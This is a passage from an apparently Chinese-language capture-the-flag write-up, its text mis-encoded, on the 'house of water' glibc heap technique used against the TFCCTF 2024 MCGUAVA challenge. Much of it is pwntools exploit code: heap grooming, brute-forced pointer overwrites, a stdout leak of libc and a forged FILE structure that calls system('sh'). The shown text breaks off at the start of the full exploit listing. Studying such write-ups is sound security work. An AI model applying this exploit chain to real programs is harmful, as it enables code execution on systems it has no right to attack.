class="line">    p.recvuntil(<span class="string">&#x27;guava no:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨æˆ‘ä»¬çš„æ•´ç†æ€è·¯æ˜¯åˆ©ç”¨ house of water å®ç° stdout ä¸Šçš„å†…å­˜åˆ†é…ï¼Œç„¶åé€šè¿‡ stdout æ³„éœ²å‡º libc çš„åœ°å€ï¼Œæœ€åé€šè¿‡ä¼ªé€  io file æ¥ getshellã€‚<br>æ—¢ç„¶ä¸Šé¢è¯´åˆ° house of water çš„å…³é”®æ˜¯ä¼ªé€  unsorted_start å’Œ unsroted_end ä¸Šæ–¹çš„2ä¸ªå°å †å—ï¼Œè¿™é‡Œå°±å…ˆè¿›è¡Œè¿™ä¸€æ­¥ï¼Œå·²ç» unsorted_start ä¸ºä¾‹</p>
<h4 id="è·å–å †å—ç´¢å¼•"><a href="#è·å–å †å—ç´¢å¼•" class="headerlink" title="è·å–å †å—ç´¢å¼•"></a>è·å–å †å—ç´¢å¼•</h4><p>å› ä¸ºæˆ‘ä»¬çš„å° fake chunk å’Œ unsorted_start æœ€ç»ˆéƒ½æ˜¯è¦ç»™ free æ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å…ˆè·å¾—ä»–çš„ç´¢å¼•ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯å †å—åˆ‡å‰²æ³•ï¼Œé€šè¿‡è®©ä¸€ä¸ªå·¨å¤§çš„å †å—è¿›å…¥ unsorted binï¼Œç„¶åæŒ‰ç…§ä¸€å®šçš„å¤§å°ç”³è¯· 2 ä¸ªå †å—å‡ºæ¥è·å–ç´¢å¼•ï¼Œç„¶åå†å°†ç”³è¯·å‡ºæ¥çš„å †å—é‡Šæ”¾æ‰ï¼Œä½¿å…¶å†æ¬¡å’Œåˆå¹¶è¿›å…¥ unsorted binï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä¸€å…±ç”³è¯·äº† 4 ä¸ªå¤§å †å—ï¼Œå…¶ä¸­ç¬¬ 4 ä¸ªå †å—æ˜¯ç”¨äºé˜²æ­¢ unsorted bin ä¸ top chunk è¿›è¡Œåˆå¹¶ã€‚å¯èƒ½æœ‰äººä¼šé—®ä¸ºä»€ä¹ˆæˆ‘è¦ç”³è¯·è¿™ä¹ˆå¤§çš„å †å—æ¥é˜²æ­¢åˆå¹¶ï¼Œå…¶å®æˆ‘æ˜¯ä¸ºäº†å‡å°‘å¯¹ tcache çš„å½±å“ï¼Œå› ä¸º house of water åçš„æ”»å‡»å°†ä¼šåœ¨ tcache_perthread_struct ä¸­è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘å°½å¯èƒ½çš„è®©æ›´å°‘çš„ chunk è¿›å…¥ tcacheã€‚è¿™é‡Œè¿›è¡Œäº† fake 0x30 å’Œ unsorted_start 2 ä¸ªå †å—ç´¢å¼•çš„è·å–ï¼Œå¹¶å°† fake 0x30 é‡Šæ”¾æ‰è¿›å…¥ tcache<br>è¿™é‡Œæˆ‘ä»¬å°†ä¸Šé¢ä»£ç è¿›è¡Œä¿®æ”¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 8 fake 0x30</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 9</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 10 </span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 11</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 12 unsorted_start</span></span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x31</span>)) <span class="comment"># 13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 14</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 15 unsorted_start</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 16</span></span><br><span class="line">free(<span class="number">15</span>) <span class="comment"># free unsorted_start</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé‡Šæ”¾äº†æˆ‘ä»¬ unsorted_startï¼Œæ­¤æ—¶ bin çš„ç»“æ„å¦‚ä¸‹ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>å¯ä»¥çœ‹åˆ° 0x30 çš„ tcache å’Œ unsorted bin æŒ‡å‘çš„æ˜¯åŒä¸€å—åŒºåŸŸï¼Œè¯´æ˜æˆ‘ä»¬ä¼ªé€ æˆåŠŸ<br>å¯¹äº unsorted_end ä¸Šæ–¹ fake chunk çš„ä¼ªé€ åŸç†ç›¸åŒï¼Œåªä¸è¿‡è¿™é‡Œçš„ fake chunk å¤§å°ä¸º 0x20ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 17</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 18 fake 0x20</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 19</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 20</span></span><br><span class="line">free(<span class="number">17</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">free(<span class="number">19</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 21</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 22 unsorted_end</span></span><br><span class="line">free(<span class="number">21</span>)</span><br><span class="line">free(<span class="number">22</span>)</span><br><span class="line">add(<span class="number">0x610</span>,<span class="number">0x608</span>,p64(<span class="number">0x21</span>)) <span class="comment"># 23</span></span><br><span class="line">free(<span class="number">23</span>)</span><br><span class="line">free(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x610</span>) <span class="comment"># 24</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 25 unsorted_end</span></span><br><span class="line">add(<span class="number">0x6e0</span>) <span class="comment"># 26</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥éœ€è¦è·å– unsorted_middle è¿™ä¸ªå †å—çš„ç´¢å¼•ï¼Œå› ä¸ºè¿™ä¸ªå †å—ä¸éœ€è¦åœ¨ä¸Šæ–¹ä¼ªé€  fake chunkï¼Œæ‰€ä»¥ç´¢å¼•æ¯”è¾ƒå®¹æ˜“è·å¾—ï¼Œç›´æ¥ç”³è¯·å³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>) <span class="comment"># 27 unsorted_middle</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment"># 28</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒä¸ªå †å—åŒæ ·æ˜¯ä¸ºäº†é˜²æ­¢åˆå¹¶<br>åé¢ä¾ç„¶è¿›è¡Œç®€å•çš„æ“ä½œï¼Œåœ¨ tcache_perthread_struct ä¸Šè¿›è¡Œ fake unsorted chunk çš„ä¼ªé€ ï¼Œè¿™éƒ¨ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå·²ç»æˆä¸ºæ¨¡æ¿åŒ–çš„ä¸œè¥¿äº†ï¼Œç”³è¯· 2 ä¸ª size åˆ†åˆ«ä¸º 0x3f0 å’Œ 0x3e0 çš„å †å—ç„¶åç›´æ¥é‡Šæ”¾æ‰å³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x3e8</span>) <span class="comment"># 29</span></span><br><span class="line">add(<span class="number">0x3d8</span>) <span class="comment"># 30</span></span><br><span class="line">free(<span class="number">29</span>)</span><br><span class="line">free(<span class="number">30</span>)</span><br></pre></td></tr></table></figure>
<p>æ•ˆæœå¦‚ä¸‹ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<h4 id="è·å–èƒ½å¤Ÿä¿®æ”¹-unsorted-start-å’Œ-unsorted-end-çš„å †å—"><a href="#è·å–èƒ½å¤Ÿä¿®æ”¹-unsorted-start-å’Œ-unsorted-end-çš„å †å—" class="headerlink" title="è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—"></a>è·å–èƒ½å¤Ÿä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—</h4><p>è¿™ä¸€æ­¥ä¸»è¦æ˜¯å› ä¸ºç¨‹åºæ²¡æœ‰ç¼–è¾‘åŠŸèƒ½ï¼Œå½“æˆ‘ä»¬å°† unsorted_endã€unsorted_middleã€unsorted_start é‡Šæ”¾è¿› unsorted bin æ—¶æˆ‘ä»¬å°±æ— æ³•ä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„æŒ‡é’ˆã€‚<br>è¿™é‡Œæˆ‘è¿˜æ˜¯ä½¿ç”¨å †å—åˆ‡å‰²æ˜¯æ€æƒ³ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x30 å’Œ unsorted_start</span></span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 31</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 32</span></span><br><span class="line">add(<span class="number">0x330</span>) <span class="comment"># 33 change unsorted_start</span></span><br><span class="line">free(<span class="number">33</span>)</span><br><span class="line">add(<span class="number">0x1e0</span>) <span class="comment"># 34</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ä¸€ä¸ª tcache çš„ç´¢å¼•ï¼Œè¯¥ tcache èƒ½å¤Ÿä¿®æ”¹ fake 0x20 å’Œ unsorted_end</span></span><br><span class="line">free(<span class="number">24</span>)</span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment"># 35</span></span><br><span class="line">add(<span class="number">0x300</span>-<span class="number">0x20</span>) <span class="comment"># 36</span></span><br><span class="line">add(<span class="number">0x340</span>) <span class="comment"># 37 change unsorted_end</span></span><br><span class="line">free(<span class="number">37</span>)</span><br><span class="line">add(<span class="number">0x1d0</span>) <span class="comment"># 38</span></span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”¨äºä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„å †å—æˆ‘é€‰æ‹©çš„å¤§å°ä¸º 0x340 å’Œ 0x350ï¼Œå› ä¸ºè¿™ä¸ª 2 ä¸ªå¤§å°çš„å †å—ä¸ªé‡Šæ”¾åæ˜¯ç›´æ¥è¿›å…¥ tcacheï¼Œå¯¹åé¢ unsorted bin ä¸­å­˜å‚¨çš„ unsorted_endã€unsorted_middleã€unsorted_start å½±å“æ¯”è¾ƒå°<br>ä½†ç”±äºè¿™ä¸ªæ“ä½œæ”¹å˜äº†åŸæ¥ unsorted_endã€unsorted_start çš„ sizeä½</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/14.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨æˆ‘ä»¬åˆšè·å–çš„ tcache å †å—æ¥å¯¹ unsorted_endã€unsorted_start çš„ size ä½è¿›è¡Œæ¢å¤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x330</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 39</span></span><br><span class="line">free(<span class="number">39</span>) </span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x18</span>,p64(<span class="number">0x511</span>)) <span class="comment"># 40</span></span><br><span class="line">free(<span class="number">40</span>)</span><br></pre></td></tr></table></figure>
<h4 id="ä¼ªé€ -fake-unsorted-chunk-çš„prev-size-å’Œ-size"><a href="#ä¼ªé€ -fake-unsorted-chunk-çš„prev-size-å’Œ-size" class="headerlink" title="ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size"></a>ä¼ªé€  fake unsorted chunk çš„prev_size å’Œ size</h4><p>å› ä¸ºæˆ‘ä»¬çš„ fake unsorted chunk æœ€ç»ˆè¿›å…¥åˆ° unsorted bin ä¸­ï¼Œunsorted bin ä¼šæ£€æµ‹è¿™ä¸ªå †å—çš„åˆæ³•æ€§ï¼Œä¼šæ£€æµ‹ fake unosrted chunk çš„ next chunk çš„prev_size å’Œ sizeï¼Œä¼ªé€ ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>):</span><br><span class="line">    add(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x210</span>) <span class="comment"># 76</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="number">0x20</span>,p64(<span class="number">0x10000</span>)+p64(<span class="number">0x20</span>)) <span class="comment"># 77</span></span><br></pre></td></tr></table></figure>
<p>æ³¨æ„è¿™é‡Œ next chunk çš„ issue ä½è¦ä¸º 0ï¼Œå› ä¸º unsorted bin ä¸Šçš„å †å—éƒ½æ˜¯æ²¡æœ‰ç»™ä½¿ç”¨çš„<br>æ¥ä¸‹æ¥å°±æ˜¯æ„‰å¿«çš„ä¸€æ¡é¾™æœåŠ¡ï¼Œä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start è¿›å…¥ unsorted binï¼Œç„¶ååˆ†åˆ«ä¿®æ”¹ unsorted_start å’Œ unsorted_end çš„ fd å’Œ bk æŒ‡é’ˆå°† fake unsorted chunk é“¾å…¥ unsorted bin ä¸­</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x238</span>) <span class="comment">#78</span></span><br><span class="line">add(<span class="number">0x248</span>) <span class="comment">#79</span></span><br><span class="line">free(<span class="number">78</span>)</span><br><span class="line">free(<span class="number">79</span>)</span><br><span class="line"><span class="comment"># ä¾æ¬¡é‡Šæ”¾ unsorted_endã€unsorted_middleã€unsorted_start</span></span><br><span class="line">free(<span class="number">25</span>)</span><br><span class="line">free(<span class="number">27</span>)</span><br><span class="line">free(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¤ unsorted_start çš„ fd æŒ‡é’ˆå’Œ unsorted_end çš„ bk æŒ‡é’ˆæŒ‡å‘ fake unsorted chunk</span></span><br><span class="line">add(<span class="number">0x330</span>,<span class="number">0x20</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 80</span></span><br><span class="line">free(<span class="number">80</span>)</span><br><span class="line">add(<span class="number">0x340</span>,<span class="number">0x28</span>,p16(<span class="number">0x0080</span>)) <span class="comment"># 81</span></span><br><span class="line">free(<span class="number">81</span>)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘æå‰ç”³è¯·äº† 2 ä¸ª chunkï¼Œå¤§å°åˆ†åˆ«ä¸º 0x240 å’Œ 0x250ï¼Œè¿™ 2 ä¸ªå †å—åœ¨åç»­çš„æ”»å‡»ä¸­ä¼šç”¨åˆ°ã€‚åœ¨ä¿®æ”¹ fd å’Œ bkæŒ‡é’ˆä¸­æˆ‘ä»¬éœ€è¦çˆ†ç ´åœ°å€çš„ç¬¬ 4 ä½ï¼Œæ¦‚ç‡ä¸º 1&#x2F;16ï¼Œæˆ‘è¿™é‡Œé€‰æ‹©çˆ†ç ´çš„æ˜¯ heapbase çš„ç¬¬ 4 ä½ä¸º 0ï¼ŒæˆåŠŸåçš„æ•ˆæœå¦‚ä¸‹ï¼š</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/15.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>å¯ä»¥çœ‹åˆ° fake unsorted chunk å·²ç»è¿›å…¥åˆ° unsorted bin ä¸­ï¼Œç°åœ¨æˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹ç›®å‰çš„çŠ¶å†µï¼š<br>ç›®å‰ unsorted bin ä¸­æœ‰ 3 ä¸ªå †å—ï¼Œä¸¤ä¾§çš„ unsorted_endã€unsorted_start å¤§å°ä¸º 0x510ï¼Œä¸­é—´çš„ fake unsorted chunk çš„å¤§å°ä¸º 0x10001ï¼Œä¸¤ä¾§çš„å †å—ååˆ†çš„ç¢äº‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†å…¶ç”³è¯·å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶ fake unsorted chunk å·²ç»è¿›å…¥åˆ° largebin ä¸­ï¼Œå¹¶åœ¨ tcache ä¸Šè¸©ä¸‹ libc çš„åœ°å€</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/16.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>ç°åœ¨æˆ‘ä»¬çš„æ€è·¯å°±éå¸¸çš„æ˜ç¡®äº†ï¼Œæˆ‘çš„åšæ³•æ˜¯å…ˆç”³è¯·ä¸€ä¸ª 0x110 å¤§å°çš„å †å—</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>))</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶ largebin çš„ fd æŒ‡é’ˆæ‰€åœ¨çš„ä½ç½®æ­£å¥½æ˜¯ tcache_perthread_struct ä¸Š 0x240 å¤§å° tcache æœ€åä¸€ä¸ª chunk çš„å­˜å‚¨åœ°å€ï¼Œæ­¤æ—¶å·²ç»ç»™è¸©ä¸Šäº† libc çš„åœ°å€</p>
<img src="/2024/08/06/house%20of%20water%20&%20TFCCTF%202024%20MCGUAVA/17.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">
<p>ç„¶åå†å°†è¯¥åœ°å€ç”³è¯·å‡ºæ¥ï¼Œå°†åœ°å€çš„ä½ 3 ä½æ”¹ä¸º stdout åœ°å€çš„ä½ 3 ä½ï¼Œçˆ†ç ´ç¬¬ 4 ä½ï¼Œç”¨ tcache åˆ†é…å †å—åˆ° stdout ä¸Šè¿›è€Œæ³„éœ²å‡º libc çš„åœ°å€ï¼Œè¿™é‡Œçš„çˆ†ç ´æˆåŠŸç‡ä¹Ÿä¸º 1&#x2F;16</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>,<span class="number">0</span>,p16(<span class="number">0x2780</span>)) </span><br><span class="line">add(<span class="number">0x230</span>,<span class="number">0</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">1</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219aa0</span></span><br></pre></td></tr></table></figure>
<p>è·å– libc åœ°å€åæˆ‘ä»¬å¯ä»¥å§åˆšæ‰ç”³è¯·åœ¨ tcache_perthread_struct ä¸Šçš„å †å—é‡Šæ”¾æ‰å†é‡æ–°ç”³è¯·å›æ¥ï¼Œç„¶ååœ¨ tcache_perthread_struct ä¸Šå­˜å‚¨ 0x250 å¤§å° tcache æœ€åä¸€ä¸ª chunk çš„åœ°æ–¹å†™ä¸Š <em>IO_2_1_stderr</em>  çš„åœ°å€ï¼Œå¹¶ç”³è¯· 0x250 å¤§å°çš„å †å—åœ¨ <em>IO_2_1_stderr</em> ä¸Šå†™ä¸Š fake file</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">86</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x8</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>])) </span><br><span class="line"></span><br><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&quot;  sh;&quot;</span>,</span><br><span class="line">    <span class="number">0x28</span>: libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>],</span><br><span class="line">    <span class="number">0x88</span>: libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xa0</span>: libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]-<span class="number">0x40</span>,   <span class="comment"># _wide_data</span></span><br><span class="line">    <span class="number">0xD8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>], <span class="comment"># jumptable </span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>) </span><br></pre></td></tr></table></figure>
<p>æœ€åè®©ç¨‹åºé€šè¿‡ exit å‡½æ•°é€€å‡ºå³å¯æ‰§è¡Œæˆ‘ä»¬çš„ fsop æ”»å‡»<br>ä¸‹é¢ç»™å‡ºå®Œæ•´ expï¼Œexp å†™çš„æ¯”è¾ƒä¹±ä¸”æ³¨é‡Šä¸Šå¯¹å †å—çš„æ ‡å·æœ‰ç‚¹ä¸å¤ªå‡†ç¡®ï¼Œè¯·å¸ˆå‚…ä»¬å¤šå¤šåŒ…å®¹ğŸ˜‡</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span 